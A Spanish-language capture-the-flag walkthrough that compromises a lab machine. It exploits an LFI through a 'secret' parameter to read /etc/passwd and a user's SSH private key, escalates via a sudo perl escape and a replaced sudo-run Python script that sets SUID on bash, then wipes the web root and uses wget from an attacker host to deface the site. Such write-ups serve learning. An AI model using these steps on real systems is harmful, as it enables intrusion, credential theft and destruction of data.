
![[20250805113215.png]](psycho-images/20250805113215.png)
# Fase de reconocimiento

Lo primero como siempre vamos a hacer un escaneo de puertos basicos con nmap 

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

una vez detectados los puertos que están abiertos vamos a hacer otro escaneo pero esta vez con scripts básicos de nmap para ver servicios y versiones 

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

![[20250805113449.png]](psycho-images/20250805113449.png)

vamos a ver que contiene el puerto 80 

![[20250805113522.png]](psycho-images/20250805113522.png)
![[20250805113543.png]](psycho-images/20250805113543.png)

podemos apreciar una pagina web sin iteración posible y al final de esta tenemos un mensaje de error como si algo no se pudiera ejecutar correctamente 

vamos a hacer un escaneo con wfuzz para ver si sacamos algún directorio de interés.

```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://172.17.0.2/FUZZ
```

![[20250805113729.png]](psycho-images/20250805113729.png)

vemos que la pagina en la que estamos en un php y quizá hay algo mal configurado por lo que se produce el error que vimos antes en la web. vamos a comprobar con fuff si existe algún parámetro escondido que nos pueda ayudar a realizar un LFI (local file inclusion)

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://172.17.0.2/?FUZZ=key"  -fs 2596 -s
```

![[20250805113910.png]](psycho-images/20250805113910.png)

vemos que existe un parámetro llamado secret asi que vamos a probar a realizar el LFI desde la web

```bash
http://172.17.0.2/index.php?secret=../../../../../../../etc/passwd
```

![[20250805114037.png]](psycho-images/20250805114037.png)

vemos que se acontece el LFI y además podemos ver en el /etc/passwd dos usuarios vaxei y luisillo. veamos si podemos conseguir algún id_rsa ya que el puerto 22 esta abierto

esta vez vamos a hacerlo por terminal en vez de por la web para ver asi varias maneras de hacer lo mismo. esto lo hago para que personas que esten empezando puedan aprender varias formas. se puede hacer todo por URL o todo por Curl de esta manera

```bash
curl -s -X GET "http://172.17.0.2/?secret=/home/vaxei/.ssh/id_rsa"
```

![[20250805114422.png]](psycho-images/20250805114422.png)

Desde el usuario luisillo no encontramos nada pero en el usuario vaxei encontramos esto.

ahora vamos a ver como podemos acceder a la maquina desde aqui.

---

# Fase de Explotación

Vamos a crear con nano un archivo llamado id_rsa y dentro pondremos el código que acabamos de encontrar de esta manera

![[20250805114640.png]](psycho-images/20250805114640.png)

lo guardamos y tratamos de conectarnos por ssh

```bash
ssh -i id_rsa vaxei@172.17.0.2
```

![[20250805114723.png]](psycho-images/20250805114723.png)

nos sale un error que deniega la rsa y nos piden contraseña por lo que vamos a intentar cambiarle los permisos a nuestra llave

```bash
chmod 0600 id_rsa
```

y probamos a conectarnos como antes 

![[20250805114834.png]](psycho-images/20250805114834.png)

ahora si tenemos acceso al sistema como vaxei

---

# Fase Post-Explotación

vamos a ver que permisos SUDO tenemos ahora mismo 

```bash
sudo -l
```

![[20250805114921.png]](psycho-images/20250805114921.png)

vemos que podemos utilizar como sudo -u luisillo sin contraseña el binario perl a si que vamos a buscar en GTFObins una manera de explotar esto

![[20250805115012.png]](psycho-images/20250805115012.png)

simplemente tenemos que poner 

```bash
sudo -u luisillo perl -e 'exec "/bin/bash";'
```

he cambiado la "sh" por una "bash" ya que para mi es mas cómodo trabajar con este tipo de SHELL 

![[20250805115303.png]](psycho-images/20250805115303.png)

podemos ver que tenemos acceso como luisillo y como podeis apreciar he intentado hacer Ctrl + L para limpiar la pantalla y no ha funcionado asi que vamos a arreglar esto 

```bash
export TERM=xterm
```

ahora si con una shell mas comoda podemos trabajar mejor.

---

# Escalada de Privilegios

repitamos lo que hemos hecho para llegar a luisillo pero esta vez desde este usuario para poder escalar a root

```bash
sudo -l
```

![[20250805115528.png]](psycho-images/20250805115528.png)

aqui podemos ver que tenemos permisos de sudo para ejecutar un script de python sin contraseña. asi que vamos a ver que contiene este script 

![[20250805115633.png]](psycho-images/20250805115633.png)

entre varias funciones vemos que se importan las librerías sys y os que nos permiten ejecutar comandos a nivel de sistema y vemos un código que pone "echo Ojo aqui" si conseguimos modificar este archivo podremos lanzar una shell como root. asi que vamos a ver que permisos tenemos sobre el archivo 

```bash
ls -l /opt/paw.py
```

![[20250805115825.png]](psycho-images/20250805115825.png)

vemos que solo root puede modificar el archivo así que vamos a ir un poco mas para atrás para comprobar si tenemos permisos en el directorio "opt"

utilizamos los comandos

```bash
cd /
```

```bash
ls -l
```

![[20250805115945.png]](psycho-images/20250805115945.png)

vamos que tenemos permisos de lectura, escritura y ejecucion en la carpeta opt asi que vamos a hacer lo siguiente
```bash
cd /opt
```

```bash
rm -rf paw.py 
```

```bash
nano paw.py
```

y en el archivo escribimos esto 

```python

import os
import sys

# Código para ejecutar el script
os.system("chmod u+s /bin/bash")
```

una vez tenemos esto vamos a ejecutarlo somo sudo

```bash
sudo python3 /opt/paw.py 
```

![[20250805120335.png]](psycho-images/20250805120335.png)

podemos comprobar que ahora la /bin/bash tiene permisos SUID por lo que podemos lanzar una shell como root 

```bash
bash -p
```

![[20250805120418.png]](psycho-images/20250805120418.png)

# Extra

y como extra realizamos nuestra banderita como explique en la maquina chocolateLovers

vamos a /var/www/html

```bash
cd /var/www/html
```

destruimos todo lo que contiene

```bash
rm -r ./*
```


abrimos en nuestra terminal de atacante un puerto con python en la carpeta donde tenemos nuestro html con el mensaje

```bash
python3 -m http.server 8081
```

y en la maquina victima ejecutamos los comandos que mostré 

```bash
wget http://192.168.1.182:8081/index.html -O index.html
```

```bash
wget http://192.168.1.182:8081/panda.png -O panda.png
```

vamos a la pagina web de la maquina victima y actualizamos 

![[20250805120743.png]](psycho-images/20250805120743.png)

Y terminamos la maquina con este regalito.
